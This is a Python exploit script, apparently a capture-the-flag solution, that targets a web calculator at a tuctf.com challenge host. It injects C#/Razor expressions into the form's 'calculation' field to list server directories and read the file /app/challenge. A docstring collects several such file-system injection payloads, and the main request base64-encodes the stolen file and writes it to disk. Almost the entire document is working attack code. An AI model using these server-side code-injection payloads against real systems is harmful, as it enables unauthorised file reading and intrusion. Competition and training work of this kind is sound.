import base64

import requests
import re
import html

headers = {
    'authority': 'aspiring-calculator.tuctf.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://aspiring-calculator.tuctf.com',
    'referer': 'https://aspiring-calculator.tuctf.com/Calculator',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
}

'''
@System.IO.Directory.GetFiles("/app").Length
@System.IO.Directory.Exists("/app")
@System.IO.Directory.GetDirectories("/app").GetValue(0).ToString()
@System.IO.Path.GetFullPath("/app/challenge")
@System.IO.Directory.GetDirectories("/app").GetValue(1).ToString()
@System.IO.File.ReadAllText("/app/challenge")
@String.Join("---", System.IO.Directory.GetFiles("/"))
@String.Join("---", System.IO.Directory.GetFiles("/"))
'''

data = {
    'calculation': 'System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(@System.IO.File.ReadAllText("/app/challenge")))',
    'calcResult': 8,
}

response = requests.post('https://aspiring-calculator.tuctf.com/Calculator', headers=headers, data=data)
content = html.unescape(re.findall(r'<input type="text" id="calcResult"(.*)/>', response.text)[0]).split()[1].replace("value=", "")

with open("challenge", "wb+") as file:
    file.write(base64.b64decode(content))
